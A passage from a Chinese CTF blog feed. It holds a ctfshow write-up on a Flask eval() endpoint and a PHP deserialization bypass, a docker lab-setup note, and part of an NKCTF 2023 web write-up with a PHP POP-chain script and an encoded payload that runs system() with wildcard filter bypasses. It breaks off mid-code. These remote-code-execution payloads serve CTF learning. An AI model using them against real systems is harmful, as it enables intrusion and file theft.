class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username in users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            session[<span class="string">&#x27;loggedin&#x27;</span>] = True</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">url_for</span>(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">render_template</span>(<span class="string">&#x27;login2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_ invoke__">register</span>():</span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> in request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> in request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username in users:</span><br><span class="line">            msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">            msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">render_template</span>(<span class="string">&#x27;register2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/profile/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">profile</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> in session:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">render_template</span>(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">url_for</span>(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/show/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">show</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> in session:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">render_template</span>(<span class="string">&#x27;show2.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/download/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">download</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> in session:</span><br><span class="line">        filename = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;filename&#x27;</span> in request.args:              </span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">send_file</span>(filename, as_attachment=True)</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">url_for</span>(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/hello/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">hello_world</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> f<span class="string">&quot;hello,&#123;eval(s)&#125;&quot;</span></span><br><span class="line">    except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span>(e)</span><br><span class="line">        pass</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/logout/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">logout</span>():</span><br><span class="line">   session.<span class="title function_ invoke__">pop</span>(<span class="string">&#x27;loggedin&#x27;</span>, None)</span><br><span class="line">   session.<span class="title function_ invoke__">pop</span>(<span class="string">&#x27;id&#x27;</span>, None)</span><br><span class="line">   session.<span class="title function_ invoke__">pop</span>(<span class="string">&#x27;username&#x27;</span>, None)</span><br><span class="line">   session.<span class="title function_ invoke__">pop</span>(<span class="string">&#x27;role&#x27;</span>, None)</span><br><span class="line">   <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">url_for</span>(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>注意到这里 可以进行命令执行 注意是python的命令执行和php的形式稍有不同</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/hello/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">hello_world</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> f<span class="string">&quot;hello,&#123;eval(s)&#125;&quot;</span></span><br><span class="line">    except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span>(e)</span><br><span class="line">        pass</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line">/hello/?<span class="keyword">eval</span>=<span class="title function_ invoke__">__import__</span>(<span class="string">&#x27;os&#x27;</span>).<span class="title function_ invoke__">popen</span>(<span class="string">&#x27;ls /&#x27;</span>).<span class="title function_ invoke__">read</span>()</span><br><span class="line">/hello/?<span class="keyword">eval</span>=<span class="title function_ invoke__">__import__</span>(<span class="string">&#x27;os&#x27;</span>).<span class="title function_ invoke__">popen</span>(<span class="string">&#x27;cat /flag_is_h3re&#x27;</span>).<span class="title function_ invoke__">read</span>()</span><br></pre></td></tr></table></figure><p>稍微解释一下 还是不太熟悉python的命令执行 是通过调用模块的方式</p><p><strong><strong>import</strong>()</strong> 函数用于动态加载类和函数  </p><p><strong>os</strong> — 操作系统接口模块</p><p><strong>os.popen()</strong> 方法用于从一个命令打开一个管道。  </p><p><strong>read()</strong> 方法用于从文件读取指定的字节数，如果未给定或为负则读取所有。  </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681711491-461b37da-6ce3-4b0d-9b1b-f5be01576642.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681726881-b115297a-f1d5-4d07-9666-f4f38e5cf138.png" alt="img"></p><h1 id="Challenge-5-easy-php"><a href="#Challenge-5-easy-php" class="headerlink" title="Challenge_5 easy_php"></a>Challenge_5 easy_php</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1+1&gt;2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题不会做，看了wp还是蛮神奇的，简单分析一下</p><p>应该是通过反序列化去执行ctfshow类中的<code>system()</code>函数</p><p>这里首先解除一下我固有的想法，我们都知道，当反序列化时首先会执行__wakeup魔术方法，这道题执行后会用到die()函数，程序运行完了，我原以为要通过增加对象属性方法去绕过__wakeup函数，但是发现没必要，因为析构函数不会受到影响。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680682560289-777732f6-fecf-4574-9c71-9b1cac882a4b.png" alt="img"></p><p>所以没必要去绕过</p><p>那么这道题目最主要的就是去绕过这个正则匹配</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们传参不能以O或者a开头</p><p>我们都知道序列化后的字符串首字母就为O 意为object对象的意思</p><p>那么这里应该怎么绕过呢</p><p>这里考到了 PHP7.3 __wakeup绕过，ArrayObject内置类 并且这个类可以起到类似于反序列化我们传入的序列化对象，当然这里说的不严谨，但可以这样理解参考：<a href="https://juejin.cn/post/7105704360155283469">https://juejin.cn/post/7105704360155283469</a> </p><p>注意这里只能在php7.3版本下才能成功，一开始复现的时候没注意到</p><p> <img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680683801763-77de8014-f72c-4c36-8e8e-b8016b18d2c3.png" alt="img"></p><p>c打头</p><p>那么问题来了，为什么要ban a字符呢ban了o字符不久行了嘛</p><p>如果不ban a 我们可以直接序列化数组去包含我们的恶意代码从而达到getshell</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680684039061-77ce25bf-492d-4fea-ab53-dc14a69e04c2.png" alt="img"></p><p>明白之后，本地构造</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680684422756-3957d554-5eb3-4b5a-b998-426f46960407.png" alt="img"></p><p>这里传参的时候记得把1+1&gt;2 url编码一下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680684325551-252a9b8d-ed0a-4898-9ddb-f3983e2a9f6e.png" alt="img"></p><p>之后就是读取了。</p><h1 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h1><p>这次最主要学到了php原生类的知识点把，tql！！！！</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php原生类 </tag>
            
            <tag> flask session伪造 </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次简单的docker开设web靶场</title>
      <link href="/post/5400d97d.html"/>
      <url>/post/5400d97d.html</url>
      
        <content type="html"><![CDATA[<p>记录一次简单的docker开设web靶场</p><span id="more"></span><h1 id="前期准备："><a href="#前期准备：" class="headerlink" title="前期准备："></a>前期准备：</h1><p>一台云服务器(这里用到了舍友的服务器&#x3D;&#x3D;)</p><p>docker环境</p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>首先自我认识什么是docker，docker就像是一个装水的杯子，在这里把里面的水叫做镜像，我们需要先下载好镜像，当运行镜像时，docker会先在本地寻找所要打开的镜像，如果找不到就会自动从docker镜像仓库下载。</p><p>这里我已经提前配置好了docker环境 上网一搜有很多安装教程</p><p><code>docker version</code>查看版本信息</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680239557401-3f605a8c-793d-4257-a9f8-8db90a07ff2f.png" alt="img"></p><p><code>docker search lamp</code> 查找lamp堆栈镜像</p><p>LAMP 堆栈是开发人员用来构建网站和 Web 应用程序的四种不同软件技术的捆绑包。</p><p>LAMP 是操作系统 Linux、Web 服务器 Apache、数据库服务器 MySQL 和编程语言 PHP 的首字母缩写  </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680244378603-6e7e24e9-493e-4cb9-8dcd-89dcc1780d88.png" alt="img"></p><p><code>docker pull  tutum/lamp</code>  下载tutum&#x2F;lamp版本的 </p><p><code>docker iamges</code> 下载好之后查看本地镜像</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680244467495-06625797-38d0-4cbc-b25c-96cc941260bf.png" alt="img"></p><p>将镜像实例化 需要分配服务器的端口 这里要在服务器管理页面给开放一个端口（比如阿里云或者腾讯云的控制台）</p><p><code>docker run -d -p 9999:80 tutum/lamp </code>这里我分配的是9999端口</p><p><code>docker ps</code>查看当前运行的容器，看到了我们刚刚启动的容器</p><p><code>docker ps -a</code>是查看所有的容器，包括当前不运行的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680245286556-0ba73951-dc0a-4cfb-84ff-670601a7ca8c.png" alt="img"></p><p>这里注意一下，区分镜像和容器的区别，一个镜像可以开很多个容器，用容器id来区分相同镜像实例化产生不同的容器，这里还是要注意记录一下自己在用的容器id，以免误删了，整个容器中的你已经弄好的文件都会被删除。</p><p><code>docker exec -it 1c0d6146aa65 bash</code> 进入我们刚刚实例化好的容器里面</p><p><code>exit</code>退出当前所在的容器</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680245570215-8d68ad83-e2c9-4028-b1a2-b17b84d337d0.png" alt="img"></p><p>接下来就是在&#x2F;var&#x2F;www&#x2F;html文件下的index.php下提交web题目的源码，然后在根目录下创建flag的文件，一个简单的web靶场复现环境就创建好了，接下来就可以愉快的复现题目了！</p><p>这里我放了一个测试php代码和根目录下的flag文件：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680246463698-c3ceb1ae-e186-4943-a0af-ad5173eba16a.png" alt="img"></p><p>还有就是这个lamp开的容器内是没有vim编辑环境的，如果直接想在容器内写代码的话，可以在容器内安装vim编辑器。</p><p>浏览器访问：<code>124.221.177.174:9999</code></p><p>成功一个简单的web靶场就搭建好了！</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680246392826-a865a0c6-42cc-4105-bcc0-b5dd202c356e.png" alt="img"></p><p>如果想关闭容器，注意这里不是删除镜像文件，只是关闭这个镜像实例化的一个容器。</p><p><code>docker stop 容器id</code>关闭容器</p><p><code>docker start 容器id</code>打开容器</p><p><code>docker rm 容器id</code> 删除容器 </p><h1 id="结尾："><a href="#结尾：" class="headerlink" title="结尾："></a>结尾：</h1><p>这里步骤截图放的图片暴露了服务器的外网ip和一些其他信息，大佬不要渗透我啊，这里只是一个热爱ctf的小菜鸡的一次记录罢了，在线求饶QWQ</p>]]></content>
      
      
      <categories>
          
          <category> 搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 搭建 </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NKCTF 2023 WEB WP</title>
      <link href="/post/8bc42760.html"/>
      <url>/post/8bc42760.html</url>
      
        <content type="html"><![CDATA[<p>NKCTF 2023 部分WEB WP</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次第一次组队，与舍友一位pwn选手(攻克三道)，打还是蛮不错的一次体验，虽然排名没有多靠前吧，坐牢两天终于啃下两道web题目，听说其他都是1day，还是大佬的比赛啊，我这种菜狗就啃啃签到题目，但收获还是很多啊。</p><p>最后只攻克了三道，也写写wp吧，也算是给自己记录一下。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679928004403-8a6fdc30-ca46-4faf-bb59-ba788d93bf12.png" alt="img"></p><h1 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h1><p>放出源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    class Welcome&#123;</span><br><span class="line">        public $name;</span><br><span class="line">        public $arg = &#x27;oww!man!!&#x27;;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;name = &#x27;ItS SO CREAZY&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            if($this-&gt;name == &#x27;welcome_to_NKCTF&#x27;)&#123;</span><br><span class="line">                echo $this-&gt;arg;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function waf($string)&#123;</span><br><span class="line">        if(preg_match(&#x27;/f|l|a|g|\*|\?/i&#x27;, $string))&#123;</span><br><span class="line">            die(&quot;you are bad&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Happy&#123;</span><br><span class="line">        public $shell;</span><br><span class="line">        public $cmd;</span><br><span class="line">        public function __invoke()&#123;</span><br><span class="line">            $shell = $this-&gt;shell;</span><br><span class="line">            $cmd = $this-&gt;cmd;</span><br><span class="line">            waf($cmd);</span><br><span class="line">            eval($shell($cmd));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Hell0&#123;</span><br><span class="line">        public $func;</span><br><span class="line">        public function __toString()&#123;</span><br><span class="line">            $function = $this-&gt;func;</span><br><span class="line">            $function();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#x27;p&#x27;]))&#123;</span><br><span class="line">        unserialize($_GET[&#x27;p&#x27;]);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>一道经典的反序列化pop链rce题目，就是我卡在最后怎么绕waf很久，我太菜了。</p><p>pop链构造很简单，主要说说waf的绕过把</p><p>waf分别禁了f l a g 字符这就导致很多linux命令都不能用了 比如ls cat tac less tail </p><p>然后还禁了通配符<code>?</code> 和<code>*</code>防止我们通过这样模糊操作去getshell  </p><p>ls 可以通过 dir来绕过  读文件用more来绕过</p><p>然后读flag就是很头疼的事情了，这里就是因为他禁了通配符给了我启发</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679891817693-acfb04f2-5a0e-4435-97f9-fdba062697b5.png" alt="img"></p><p>参考：<a href="https://abcfy2.gitbooks.io/linux_basic/content/first_sense_for_linux/command_learning/wildcard.html">https://abcfy2.gitbooks.io/linux_basic/content/first_sense_for_linux/command_learning/wildcard.html</a></p><p>还有一种通配符是<code>[]</code>可以匹配指定范围中的任意字符 那么 f和g就可以用<code>[e-h]</code>来绕过</p><p>a是字母表第一个，该怎么绕过呢，我们可以构造<code>[非数字]</code>形式:<code>[^0-9]</code> 这里尖括号就是排除匹配范围，这也就可以包含所有字母 来达到获取a的效果了</p><p>本地构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    class Welcome&#123;</span><br><span class="line">        public $name;</span><br><span class="line">        public $arg = &#x27;oww!man!!&#x27;;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;name = &#x27;welcome_to_NKCTF&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Happy&#123;</span><br><span class="line">        public $shell;</span><br><span class="line">        public $cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    class Hell0&#123;</span><br><span class="line">        public $func;</span><br><span class="line">    &#125;</span><br><span class="line">$a=new Welcome();</span><br><span class="line">$a-&gt;arg = new Hell0();</span><br><span class="line">$a-&gt;arg-&gt;func = new Happy();</span><br><span class="line">$a-&gt;arg-&gt;func-&gt;shell=&#x27;system&#x27;;    </span><br><span class="line">$a-&gt;arg-&gt;func-&gt;cmd=&quot;more  /[e-h]1[^0-9][e-h]&quot;;</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>记得最后payload url编码一下 反序列化题目的常用套路了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p=O%3A7%3A%22Welcome%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A16%3A%22welcome_to_NKCTF%22%3Bs%3A3%3A%22arg%22%3BO%3A5%3A%22Hell0%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A5%3A%22shell%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22cmd%22%3Bs%3A24%3A%22more++%2F%5Be-h%5D1%5B%5E0-9%5D%5Be-h%5D%22%3B%7D%7D%7D</span><br></pre></td></tr></table></figure><p>拿到flag</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679892001266-d44e146e-ab39-40b0-98f5-4f46ab72ee96.png" alt="img"></p><h1 id="esay-php"><a href="#esay-php" class="headerlink" title="esay_php"></a>esay_php</h1><p>放出源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    if($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;] &amp;&amp; md5($_GET[&#x27;a&#x27;]) == md5($_GET[&#x27;b&#x27;]))&#123;</span><br><span class="line">        if((string)$_POST[&#x27;c&#x27;] != (string)$_POST[&#x27;d&#x27;] &amp;&amp; sha1($_POST[&#x27;c&#x27;]) === sha1($_POST[&#x27;d&#x27;]))&#123;</span><br><span class="line">            if($_GET[&#x27;e&#x27;] != 114514 &amp;&amp; intval($_GET[&#x27;e&#x27;]) == 114514)&#123;</span><br><span class="line">                if(isset($_GET[&#x27;NS_CTF.go&#x27;]))&#123;</span><br><span class="line">                    if(isset($_POST[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">                        if(!preg_match(&#x27;/[0-9a-zA-Z]/i&#x27;, $_POST[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">                            eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">                        &#125;else&#123;</span><br><span class="line">                            die(&#x27;error!!!!!!&#x27;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;else&#123;</span><br><span class="line">                        die(&#x27;error!!!!!&#x27;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    die(&#x27;error!!!!&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                die(&#x27;error!!!&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&#x27;error!!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&#x27;error!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这是一道md5弱相等，sha1碰撞，php字符串解析特性这里是考php命名规则合法与否，还有就是无数字字母rce。</p><h2 id="sha1碰撞"><a href="#sha1碰撞" class="headerlink" title="sha1碰撞"></a>sha1碰撞</h2><p>来看sha1碰撞：</p><p>之前有做过md5强相等的题目，因为被string强转化了，所以一些常见的数组绕过就不能用了，只能老实用脚本碰撞，sha1和md5做法很相似。</p><p>sha1 — 计算字符串的 sha1 散列值</p><p>在这里先说一说md5强类型字符串转换后碰撞相等吧</p><p>这里有专门md5碰撞的脚本：<a href="https://blog.csdn.net/shuaicenglou3032/article/details/118197904">https://blog.csdn.net/shuaicenglou3032/article/details/118197904</a> </p><p>本地测试</p><p>先拿到散列值：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679926136860-9c662264-fd6e-411f-9074-2a2201872239.png" alt="img"></p><p>本地写一个测试demo</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span 